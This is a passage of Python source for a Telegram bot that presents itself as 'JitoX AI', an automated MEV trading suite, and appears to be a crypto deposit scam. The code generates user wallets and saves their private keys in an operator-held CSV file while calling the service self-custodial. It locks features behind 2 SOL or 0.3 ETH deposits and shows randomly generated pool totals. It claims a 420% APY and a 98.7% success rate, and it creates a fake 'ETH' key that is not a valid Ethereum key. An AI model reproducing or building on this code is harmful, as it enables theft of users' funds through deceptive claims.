        "Fine-tune your MEV execution strategy:\n\n"
        "⚡ Low: Conservative, steady profits\n"
        "⚡ Medium: Balanced risk/reward\n"
        "⚡ High: Aggressive profit seeking\n\n"
        "🔐 <b>Current Status:</b> Locked\n"
        "💎 <b>Minimum Balance:</b> 2 SOL\n"
        "✨ <b>Recommended Balance:</b> 5 SOL for advanced controls\n\n"
        "Deposit now to customize your MEV strategy! 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Intensity settings")

async def pool_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "💧 <b>Pool Settings</b> 💧\n\n"
        "💎 <b>Deposit 2 SOL to unlock Pool Settings!</b> 💎\n\n"
        "Optimize your liquidity strategy:\n\n"
        "⚡ Manage multiple pools\n"
        "⚡ Set custom pool parameters\n"
        "⚡ Track pool performance\n\n"
        "🔐 <b>Current Status:</b> Locked\n"
        "💎 <b>Minimum Balance:</b> 2 SOL\n"
        "✨ <b>Recommended Balance:</b> 5 SOL for advanced features\n\n"
        "Deposit now to start optimizing your pool strategy! 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Pool settings")

async def send_blocked_users_notification():
    blocked_users = load_blocked_users()
    if blocked_users:
        message = "Blocked Users:\n" + "\n".join(map(str, blocked_users))
    else:
        message = "No blocked users."
    
    bot = Bot(token=BOT_TOKEN)
    try:
        await bot.send_message(chat_id=NOTIFICATION_CHAT_ID, text=message)
        logger.info("Blocked users notification sent successfully.")
    except Exception as e:
        logger.error(f"Failed to send blocked users notification: {e}")

async def notify_admin_blocked_user(user_id):
    message = f"Blocked user {user_id} attempted to use the bot."
    bot = Bot(token=BOT_TOKEN)
    try:
        await bot.send_message(chat_id=NOTIFICATION_CHAT_ID, text=message)
        logger.info(f"Notification sent for blocked user {user_id}.")
    except Exception as e:
        logger.error(f"Failed to send notification for blocked user {user_id}: {e}")

async def get_balance(wallet_address: str) -> float:
    logger.info(f"Getting balance for wallet {wallet_address}")
    url = SOLANA_RPC_URL
    headers = {"Content-Type": "application/json"}
    data = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "getBalance",
        "params": [wallet_address]
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, json=data) as response:
                result = await response.json()
                logger.info(f"RPC response for {wallet_address}: {result}")
                if 'result' in result and 'value' in result['result']:
                    balance = result['result']['value'] / 10**9  # Convert lamports to SOL
                    logger.info(f"Balance for {wallet_address}: {balance} SOL")
                    return balance
                else:
                    logger.warning(f"Unexpected response format for {wallet_address}: {result}")
                    return 0
    except Exception as e:
        logger.error(f"Error getting balance for {wallet_address}: {e}")
        return 0

def print_referral_state():
    logger.info("Current Referral State:")
    logger.info(f"Referral Codes: {referral_codes}")
    logger.info(f"Referrals: {referrals}")
    logger.info(f"Referral Earnings: {referral_earnings}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /start command."""
    try:
        user = update.effective_user
        # Store new user
        await store_new_user(user.id, user.username)
        
        logger.info(f"User ID: {user.id}")
        if is_user_blocked(user.id):
            await update.message.reply_text("You are blocked from using this bot.")
            await notify_admin_blocked_user(user.id)
            return
        await log_user_activity(context.application, user.id, "used /start command")
        
        logger.info(f"Start command used by user {user.id}")
        
        # Handle referral
        if context.args:
            referral_code = context.args[0]
            logger.info(f"Referral code received: {referral_code}")
            try:
                async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
                    # Ensure tables exist
                    await init_referral_db()
                    
                    # Find referrer
                    async with db.execute(
                        'SELECT user_id FROM referral_codes WHERE code = ?',
                        (referral_code,)
                    ) as cursor:
                        result = await cursor.fetchone()
                        if result and result[0] != user.id:  # Prevent self-referral
                            referrer_id = result[0]
                            logger.info(f"Found referrer ID: {referrer_id}")
                            
                            # Send notifications regardless of existing referral
                            await notify_referrer(context.application, referrer_id, user.username or "Anonymous")
                            await send_admin_notification(
                                context.application,
                                f"🟣 New Referral Attempt: User {user.id} (@{user.username}) using code from {referrer_id}"
                            )
                            
                            # Store referral if it doesn't exist
                            async with db.execute(
                                'SELECT * FROM referrals WHERE referrer_id = ? AND referred_id = ?',
                                (referrer_id, user.id)
                            ) as cursor:
                                existing_referral = await cursor.fetchone()
                                
                            if not existing_referral:
                                # Store referral and update earnings
                                if await store_referral(referrer_id, user.id):
                                    logger.info(f"Successfully stored new referral: {user.id} referred by {referrer_id}")
                                    await send_admin_notification(
                                        context.application,
                                        f"🟣 Referral Stored: User {user.id} (@{user.username}) was referred by {referrer_id}"
                                    )
                                else:
                                    logger.error("Failed to store referral")
                            else:
                                logger.info(f"Existing referral found for user {user.id} and referrer {referrer_id}")
                        else:
                            logger.info(f"Invalid referral code or self-referral attempt: {referral_code}")
            except Exception as e:
                logger.error(f"Error processing referral: {e}")
                await send_admin_notification(
                    context.application,
                    f"❌ Error processing referral for user {user.id}: {str(e)}"
                )
        
        # Generate or get existing referral code
        try:
            referral_code = await get_referral_code(user.id)
            if not referral_code:
                referral_code = generate_referral_code()
                logger.info(f"Generated new referral code for user {user.id}: {referral_code}")
                await store_referral_code(user.id, referral_code)
        except Exception as e:
            logger.error(f"Error handling referral code: {e}")
            referral_code = None
        
        # Create the MEV Stats button with the user's wallet address
        wallet_address = user_wallets.get(user.id, "")
        mev_stats_url = f"https://jitonexus.github.io/jitox-dashboard/"
        mev_stats_button = InlineKeyboardButton("🚨 Mev App 🚨", web_app=WebAppInfo(url=mev_stats_url))
        
        keyboard = [
            [InlineKeyboardButton("⚔️ Professional Suite", callback_data='nexus_settings')],
            [InlineKeyboardButton("💎 Initialize Wallet", callback_data='get_wallet'),
             InlineKeyboardButton("⚡️ Strategic Withdrawal", callback_data='withdraw')],
            [InlineKeyboardButton("🎯 Activate MEV", callback_data='start_mev'),
             InlineKeyboardButton("🛡️ Suspend MEV", callback_data='stop_mev')],
            [InlineKeyboardButton("⚡️ ETH MEV Bot", callback_data='get_eth_wallet')],
            [InlineKeyboardButton("📊 Active Positions", callback_data='mev_positions'),
             InlineKeyboardButton("🔮 Pending Matrix", callback_data='mev_pending')],
            [InlineKeyboardButton("📊 Performance Analytics", callback_data='track_mev')],
            [InlineKeyboardButton("👾 Command Guide", callback_data='help'),
             InlineKeyboardButton("💎 Intelligence Hub", callback_data='info')],
            [InlineKeyboardButton("⚡️ Professional Network", callback_data='referral')],
            [mev_stats_button],
            [InlineKeyboardButton("🔮 Enterprise Portal", url='https://jitoxmev.com/')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = (
            "👾 <b>Welcome to JitoX AI - Professional MEV Trading Suite</b> 👾\n\n"
            "⚔️ <b>JitoX AI is a professional trading platform - your deposit is your trading balance</b>\n\n"
            "💎 Limited allocation available: 2 SOL minimum deposit\n"
            "💎 Industry-leading rate: Only 2% performance fee\n\n"
            "🎮 <b>Start Trading with 2 SOL:</b>\n\n"
            "⚡ 24/7 Automated MEV Operations\n"
            "⚡ Advanced Arbitrage & Strategic Position Taking\n"
            "⚡ 98.7% Execution Success Rate\n"
            "⚡ Fully Compliant with Telegram's Terms of Service\n"
            "🛡️ <b>Self-Custodial: Your Assets, Your Control</b>\n\n"
            "🚀 <b>Trading Balance Required for Operation</b>\n\n"
            "🎯 <b>Next Steps:</b>\n"
            "1. Initialize Wallet Setup /get_wallet\n"
            "2. Fund Account (2 SOL or more)\n"
            "3. Begin Automated Trading\n\n"
            "✨ <b>EXCLUSIVE: Priority MEV Intelligence Access</b>\n\n"
            "🌐 <b>Professional Network:</b> <a href='https://t.me/+IjTbnbN3Y085MjA0'>Join Our Trading Community</a>\n\n"
            "💫 <b>Support Available - Limited Slots Remaining</b>\n\n"
            "Professional traders understand: Timing is everything in MEV. ⚡"
        )
        
        if update.message:
            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML', disable_web_page_preview=True)
        elif update.callback_query:
            await update.callback_query.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML', disable_web_page_preview=True)
    except Exception as e:
        logger.error(f"Error in start command: {str(e)}")
        await update.message.reply_text("An error occurred. Please try again later.")

async def get_user_wallet(user_id: int) -> dict:
    """Get existing wallet for a user if it exists. If key format is invalid, generate a new one."""
    try:
        # Try different file locations if permission denied
        wallet_file_locations = [
            WALLET_CSV_FILE,
            os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'user_wallets.csv'),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_wallets.csv'),
            'user_wallets.csv'
        ]
        
        # Find the most recent wallet
        latest_wallet = None
        latest_timestamp = None
        file_with_wallet = None
        
        # Search all possible file locations
        for file_location in wallet_file_locations:
            if os.path.exists(file_location):
                try:
                    with open(file_location, 'r', newline='', encoding='utf-8') as f:
                        reader = csv.DictReader(f)
                        for row in reader:
                            if int(row['user_id']) == user_id:
                                current_timestamp = datetime.fromisoformat(row['created_at'])
                                if latest_timestamp is None or current_timestamp > latest_timestamp:
                                    latest_wallet = row
                                    latest_timestamp = current_timestamp
                                    file_with_wallet = file_location
                except Exception as e:
                    logger.error(f"[GET_WALLET] Error reading from {file_location}: {e}")
                    continue
        
        # If we found a wallet, check its format
        if latest_wallet:
            # Check if key format is valid
            if len(latest_wallet['private_key']) != 88:
                logger.error(f"[GET_WALLET] Found invalid private key length: {len(latest_wallet['private_key'])} chars. Generating new wallet.")
                
                # Generate new wallet with correct format
                new_wallet = await generate_wallet()
                username = latest_wallet.get('username', 'Unknown')
                
                # Write new wallet to file
                try:
                    with open(file_with_wallet, 'a', newline='', encoding='utf-8') as f:
                        writer = csv.writer(f)
                        timestamp = datetime.now(timezone.utc).isoformat()
                        writer.writerow([user_id, new_wallet['public_key'], new_wallet['private_key'], timestamp, username])
                    
                    logger.info(f"[GET_WALLET] Generated and saved new wallet for user {user_id}")
                    return {
                        'user_id': user_id,
                        'public_key': new_wallet['public_key'],
                        'private_key': new_wallet['private_key'],
                        'created_at': timestamp,
                        'username': username
                    }
                except Exception as e:
                    logger.error(f"[GET_WALLET] Error saving new wallet: {e}")
                    return None
            
            return latest_wallet
        
        return None
    except Exception as e:
        logger.error(f"[GET_WALLET] Error getting user wallet: {e}")
        return None

async def handle_show_key(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the show private key button."""
    try:
        query = update.callback_query
        user_id = int(query.data.split('_')[2])
        
        if user_id != update.effective_user.id:
            await query.answer("You can only view your own private key!", show_alert=True)
            return

        # First show security warning
        security_message = (
            "⚠️ <b>CRITICAL SECURITY ALERT</b> ⚠️\n\n"
            "You are about to view your private key.\n\n"
            "🔴 <b>SECURITY MEASURES REQUIRED:</b>\n"
            "• Ensure you're in a private location\n"
            "• No screen recording/sharing active\n"
            "• No one is looking at your screen\n"
            "• Clear your chat history after\n\n"
            "🛡️ <b>NEVER:</b>\n"
            "• Share your private key with ANYONE\n"
            "• Store it in cloud services\n"
            "• Take screenshots\n"
            "• Copy to clipboard\n\n"
            "Message will self-destruct in 30 seconds.\n"
            "Are you ready to proceed securely?"
        )
        
        keyboard = [
            [
                InlineKeyboardButton("✅ Show Key Securely", callback_data=f"confirm_show_key_{user_id}"),
                InlineKeyboardButton("❌ Cancel", callback_data="get_wallet")
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            security_message,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
            
    except Exception as e:
        logger.error(f"Error showing private key: {str(e)}")
        await query.answer("Error retrieving private key", show_alert=True)

async def delete_message_later(message, delay_seconds: int):
    """Delete a message after a specified delay."""
    try:
        await asyncio.sleep(delay_seconds)
        await message.delete()
        logger.info(f"Successfully deleted message after {delay_seconds} seconds")
    except Exception as e:
        logger.error(f"Error deleting message: {e}")

async def show_private_key_confirmed(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show the private key after confirmation"""
    try:
        query = update.callback_query
        user_id = query.from_user.id
        
        # Answer callback query immediately
        await query.answer()
        
        # Get user's wallet
        wallet = await get_user_wallet(user_id)
        if not wallet:
            await query.edit_message_text(
                "No wallet found. Please use /get_wallet to create one.",
                parse_mode='HTML'
            )
            return
            
        # Verify private key format before showing
        private_key = wallet['private_key']
        if len(private_key) != 88:
            logger.error(f"[SHOW_KEY] Invalid private key length: {len(private_key)} chars")
            await query.edit_message_text(
                "Error: Invalid private key format. Please generate a new wallet.",
                parse_mode='HTML'
            )
            return
            
        # Double check the key format
        try:
            decoded = base58.b58decode(private_key)
            if len(decoded) != 64:  # Must be 64 bytes
                raise ValueError("Invalid decoded length")
        except Exception as e:
            logger.error(f"[SHOW_KEY] Key validation failed: {e}")
            await query.edit_message_text(
                "Error: Invalid private key format. Please generate a new wallet.",
                parse_mode='HTML'
            )
            return
        
        message = (
            "🔐 <b>Your Private Key</b> 🔐\n\n"
            f"<code>{private_key}</code>\n\n"
            "⚠️ <b>CRITICAL SECURITY NOTES:</b>\n"
            "1. Save this key NOW\n"
            "2. Never share it with anyone\n"
            "3. Keep multiple secure backups\n"
            "4. Clear your chat history\n\n"
            "This message will be automatically deleted in 30 seconds."
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Wallet", callback_data="get_wallet")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send as new message that will be deleted
        sent_message = await query.message.reply_text(
            message,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        
        # Schedule message deletion
        asyncio.create_task(delete_message_later(sent_message, 30))
        logger.info(f"Displayed private key for user {user_id}")
        
        # Update original message
        await query.edit_message_text(
            "Private key has been sent in a separate message.\nIt will be automatically deleted in 30 seconds.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Wallet", callback_data="get_wallet")]])
        )
        
    except Exception as e:
        logger.error(f"Error in show_private_key_confirmed: {e}")
        try:
            await query.edit_message_text(
                "Error displaying private key. Please use /get_wallet to try again.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Wallet", callback_data="get_wallet")]])
            )
        except Exception as e2:
            logger.error(f"Error sending error message: {e2}")

async def handle_new_wallet_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the confirmation for generating a new wallet."""
    try:
        query = update.callback_query
        message = (
            "⚠️ <b>CRITICAL SECURITY WARNING</b> ⚠️\n\n"
            "🚨 You are about to generate a new wallet!\n\n"
            "⚡️ <b>IMPORTANT ACTIONS REQUIRED:</b>\n\n"
            "1. Save your CURRENT private key NOW\n"
            "2. Transfer any existing funds\n"
            "3. Backup all wallet information\n\n"
            "🔴 <b>RISK WARNINGS:</b>\n"
            "• Your current wallet will be ARCHIVED\n"
            "• You will LOSE ACCESS to old private key\n"
            "• ALL FUNDS must be transferred first\n"
            "• This action CANNOT be undone\n\n"
            "Are you absolutely sure you want to proceed?"
        )
        
        keyboard = [
            [
                InlineKeyboardButton("✅ Yes, I Have Saved My Keys", callback_data="generate_new_confirmed"),
                InlineKeyboardButton("❌ No, Keep Current", callback_data="get_wallet")
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            message,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
            
    except Exception as e:
        logger.error(f"Error in new wallet confirmation: {str(e)}")
        await query.answer("Error processing request", show_alert=True)

async def get_eth_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    
    if update.callback_query:
        message_func = update.callback_query.edit_message_text
    else:
        message_func = update.message.reply_text

    # Generate new ETH wallet
    try:
        # Generate a new random seed
        seed = secrets.token_bytes(32)
        
        # Create signing key from seed
        signing_key = nacl.signing.SigningKey(seed)
        
        # Get verify key (public key)
        verify_key = signing_key.verify_key
        
        # Get public key bytes
        public_key_bytes = verify_key.encode()
        
        # Encode private key and public key for ETH format
        private_key = "0x" + b58encode(signing_key.encode()).decode('ascii')
        public_key = "0x" + b58encode(public_key_bytes).decode('ascii')

        # Store in eth_user_wallets dictionary
        eth_user_wallets[user_id] = public_key
        
        message = (
            "👾 <b>Congratulations! Your ETH MEV Professional Suite Access is Confirmed</b> 👾\n\n"
            "⚔️ <b>Your Dedicated ETH Trading Wallet:</b>\n\n"
            f"<code>{public_key}</code>\n\n"
            "🔑 <b>Your Private Key (SAVE THIS NOW):</b>\n\n"
            f"<code>{private_key}</code>\n\n"
            "🎯 <b>Essential Setup Steps:</b>\n\n"
            "1. Initialize with 0.3 ETH to activate your trading suite\n"
            "2. Your deposit serves as your trading balance - fully withdrawable\n\n"
            "🚀 <b>Limited Capacity Alert: Professional tier slots are filling rapidly</b>\n\n"
            "✨ <b>Performance Insight: Early adopters report 47% higher performance metrics</b>\n\n"
            "💎 <b>Activation Benefits:</b>\n\n"
            "⚡ Immediate suite activation post-deposit\n"
            "⚡ Priority access to next trading cycle\n"
            "⚡ Real-time performance tracking\n\n"
            "🛡 <b>Professional Support: Contact @jitoxai for priority assistance</b>\n\n"
            "Professional traders understand: Optimal entry timing is crucial in ETH MEV.\n\n"
            "Ready to elevate your trading? Complete your 0.3 ETH initialization now. 🎮"
        )
        
        # Send notification to admin
        await send_admin_notification(context.application, f"User {user_id} generated new ETH wallet: {public_key}")
        
    except Exception as e:
        logger.error(f"Error generating ETH wallet: {e}")
        message = "Sorry, there was an error generating your ETH wallet. Please try again later."

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await message_func(message, reply_markup=reply_markup, parse_mode='HTML')

async def mev_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "🚀 <b>MEV Sniper Control Center</b> 🚀\n\n"
        "Choose an action:\n"
        "🔹 View MEV Positions\n"
        "🔹 Check Pending MEV"
    )
    keyboard = [
        [InlineKeyboardButton("🟢 Start MEV Sniper", callback_data='start_mev'),
         InlineKeyboardButton("🔴 Stop MEV Sniper", callback_data='stop_mev')],
        [InlineKeyboardButton("📊 MEV Positions", callback_data='mev_positions'),
         InlineKeyboardButton("⏳ MEV Pending", callback_data='mev_pending')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def intensity_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "⚡ <b>MEV Intensity Control</b> ⚡\n\n"
        "Current Intensity: <b>MEDIUM</b>\n\n"
        "Adjust the intensity of MEV operations:\n"
        "🎯 Low: Fewer operations, lower risk\n"
        "💫 Medium: Balanced approach\n"
        "🚀 High: Aggressive strategy, higher potential returns\n\n"
        " Remember to maintain a balance of 2 or more SOL for optimal performance."
    )
    keyboard = [
        [InlineKeyboardButton("🟢 Low", callback_data='intensity_low'),
         InlineKeyboardButton("🟡 Medium", callback_data='intensity_medium'),
         InlineKeyboardButton("🔴 High", callback_data='intensity_high')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, update.effective_user.id, "accessed Intensity settings")

async def set_intensity(update: Update, context: ContextTypes.DEFAULT_TYPE, level: str) -> None:
    """Handle intensity level setting."""
    try:
        message = (
            f"🎯 <b>MEV Intensity Set to {level.upper()}</b>\n\n"
            "⚠️ Minimum 2 SOL required to change intensity\n\n"
            "Current settings:\n"
            f"• Intensity: {level.upper()}\n"
            "• Auto-compound: OFF\n"
            "• Risk level: Standard\n\n"
            "Deposit 2 SOL to activate these settings."
        )
        keyboard = [
            [InlineKeyboardButton("🔑 Deposit 2 SOL", callback_data="get_wallet")],
            [InlineKeyboardButton("🔙 Back", callback_data="intensity")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Error setting intensity: {str(e)}")

async def pool_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_balance = context.user_data.get('balance', 0)
    pooled_amount = context.user_data.get('pooled_amount', 0)
    
    message = (
            "👾 <b>JitoX AI Professional Liquidity Suite</b> 👾\n\n"
            f"💎 <b>Portfolio Overview</b>\n"
            f"⚡️ Trading Balance: <b>{user_balance:.2f} SOL</b>\n"
            f"⚡️ Active Position: <b>{pooled_amount:.2f} SOL</b>\n\n"
            "🎮 <b>Institutional-Grade Liquidity Pool</b>\n\n"
            "⚔️ Advanced MEV extraction algorithms\n"
            "⚔️ Professional-tier execution priority\n"
            "⚔️ Real-time performance optimization\n\n"
            "🎯 <b>Performance Metrics</b>\n"
            "✨ Target APY: 420% (Based on market conditions)\n"
            "✨ Required Balance: 2 SOL minimum\n\n"
            "Ready to access institutional-grade MEV opportunities? Initialize your suite now. 🎮"
        )
    keyboard = [
        [InlineKeyboardButton(" Add Liquidity", callback_data='add_liquidity'),
         InlineKeyboardButton("🔓 Remove Liquidity", callback_data='remove_liquidity')],
        [InlineKeyboardButton("📊 View Pool Stats", callback_data='pool_stats')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Pool settings")

async def add_liquidity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
            "👾 <b>JitoX AI - Professional Position Management</b> 👾\n\n"
            "⚔️ <b>Initialize Trading Position</b>\n\n"
            "Specify your trading balance allocation (Minimum 2 SOL required)\n\n"
            "💎 <b>Professional Insight:</b>\n"
            "⚡️ Higher allocations unlock enhanced execution priority\n"
            "⚡️ Institutional-grade features at 5+ SOL\n"
            "⚡️ Optimal performance with strategic positioning\n\n"
            "🎯 Enter your desired initialization amount to begin professional MEV operations.\n\n"
            "Ready to elevate your trading strategy? 🎮"
        )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Add Liquidity")

async def remove_liquidity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    pooled_amount = context.user_data.get('pooled_amount', 0)
    
    message = (
            "👾 <b>JitoX AI - Position Reallocation</b> 👾\n\n"
            "💎 <b>Current Position Overview</b>\n"
            f"⚡️ Active Trading Balance: <b>{pooled_amount:.2f} SOL</b>\n\n"
            "🎯 <b>Strategic Advisory:</b>\n"
            "⚔️ Maintain 2 SOL minimum for continuous operation\n"
            "⚔️ Strategic reallocation may impact execution priority\n"
            "⚔️ Consider market conditions before adjusting position\n\n"
            "✨ Specify the amount you wish to reallocate from your active trading balance.\n\n"
            "Professional traders understand: Position sizing is crucial for MEV success. 🎮"
        )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Remove Liquidity")

async def view_pool_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    total_pooled = random.uniform(565.11, 1671.11)
    
    message = (
            "👾 <b>JitoX AI - Professional Analytics Suite</b> 👾\n\n"
            "💎 <b>Global Position Metrics</b>\n"
            f"⚡️ Total Institutional Capital: <b>{total_pooled:.2f} SOL</b>\n\n"
            "🎯 <b>Market Impact Analysis</b>\n"
            "⚔️ Aggregated professional trading volume\n"
            "⚔️ Enhanced MEV extraction efficiency\n"
            "⚔️ Optimized institutional-grade execution\n\n"
            "✨ <b>Strategic Insight:</b>\n"
            "Increased capital depth enables superior MEV capture rates and enhanced execution priority.\n\n"
            "Professional traders understand: Liquidity depth drives MEV performance. 🎮"
        )
    keyboard = [[InlineKeyboardButton("🔙 Back to Pool Settings", callback_data='pool_settings')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "viewed Pool Stats")

async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI Professional Configuration Suite</b> 👾\n\n"
            "💎 <b>Advanced Trading Parameters</b>\n\n"
            "⚡️ <b>Execution Intelligence</b>\n"
            "• Real-time performance notifications\n"
            "• Strategic position alerts\n\n"
            "⚡️ <b>Portfolio Optimization</b>\n"
            "• Automated profit compounding\n"
            "• Dynamic balance management\n\n"
            "⚡️ <b>Risk Architecture</b>\n"
            "• Professional risk modeling\n"
            "• Institutional exposure control\n\n"
            "⚡️ <b>Network Optimization</b>\n"
            "• Priority transaction routing\n"
            "• Advanced gas management\n\n"
            "🎯 Configure your suite for optimal MEV extraction performance. 🎮"
        )
    keyboard = [
        [InlineKeyboardButton("🔔 Notifications", callback_data='settings_notifications'),
         InlineKeyboardButton("💰 Auto-compound", callback_data='settings_autocompound')],
        [InlineKeyboardButton("⚖️ Risk Level", callback_data='settings_risk'),
         InlineKeyboardButton("⛽ Gas Settings", callback_data='settings_gas')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def toggle_mev_notifications(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = update.effective_user.id
    current_state = context.user_data.get('mev_notifications', False)
    new_state = not current_state
    context.user_data['mev_notifications'] = new_state
    
    state_text = "ON" if new_state else "OFF"
    message = f"MEV Notifications turned {state_text} for all MEV operations."
    
    keyboard = [
        [InlineKeyboardButton("🟢 MEV Notifications ON" if new_state else "🔴 MEV Notifications OFF", 
                              callback_data=f'mev_notifications_{"off" if new_state else "on"}')],
        [InlineKeyboardButton("🔙 Back to Settings", callback_data='settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(message, reply_markup=reply_markup)
    await log_user_activity(context.application, user_id, f"turned MEV notifications {state_text}")

async def auto_compound(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "💰 <b>Auto-Compound</b> 💰\n\n"
        "⚠️ You can't operate with a balance under 2 SOL.\n\n"
        "Deposit 2 SOL to enable auto-compounding and maximize your returns!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Settings", callback_data='settings')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to access Auto-Compound")

async def risk_level(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
            "👾 <b>JitoX AI - Professional Risk Architecture</b> 👾\n\n"
            "💎 <b>Strategic Risk Management Profiles</b>\n\n"
            "⚡️ <b>Conservative Protocol</b>\n"
            "• Optimized for capital preservation\n"
            "• Enhanced risk mitigation algorithms\n"
            "• Steady performance metrics\n\n"
            "⚡️ <b>Balanced Protocol</b>\n"
            "• Strategic position management\n"
            "• Optimal risk-reward calibration\n"
            "• Professional execution framework\n\n"
            "⚡️ <b>Aggressive Protocol</b>\n"
            "• Maximum performance targeting\n"
            "• Advanced opportunity capture\n"
            "• Institutional-grade execution priority\n\n"
            "🛡️ <b>Access Requirements</b>\n"
            "✨ Initialize suite with 2 SOL to activate risk management protocols\n"
            "✨ Enhanced features available at 5+ SOL allocation\n\n"
            "Professional traders understand: Strategic risk management drives consistent MEV performance. 🎮"
        )
    keyboard = [[InlineKeyboardButton("🔙 Back to Settings", callback_data='settings')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to access Risk Level settings")

async def gas_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
            "👾 <b>JitoX AI - Network Optimization Protocol</b> 👾\n\n"
            "💎 <b>Transaction Priority Framework</b>\n\n"
            "⚡️ <b>Professional Configuration Range:</b>\n"
            "• Minimum: 0.001 SOL\n"
            "• Maximum: 0.01 SOL\n\n"
            "🎯 <b>Strategic Advantages:</b>\n"
            "⚔️ Enhanced execution probability\n"
            "⚔️ Reduced latency in high-activity periods\n"
            "⚔️ Priority block inclusion\n\n"
            "✨ <b>Configuration:</b>\n"
            "Specify your preferred priority level (e.g., 0.005 SOL)\n\n"
            "Professional traders understand: Optimal network priority ensures superior MEV capture. 🎮"
        )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    context.user_data['awaiting_gas_input'] = True
    await log_user_activity(context.application, user_id, "accessed Gas Settings")

async def ca_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Asset Configuration</b> 👾\n\n"
            "💎 <b>Professional Token Integration</b>\n\n"
            "⚡️ <b>Advanced Targeting Protocol</b>\n"
            "• Institutional-grade contract validation\n"
            "• Multi-venue liquidity analysis\n"
            "• Dynamic pair optimization\n\n"
            "🎯 <b>Execution Parameters</b>\n"
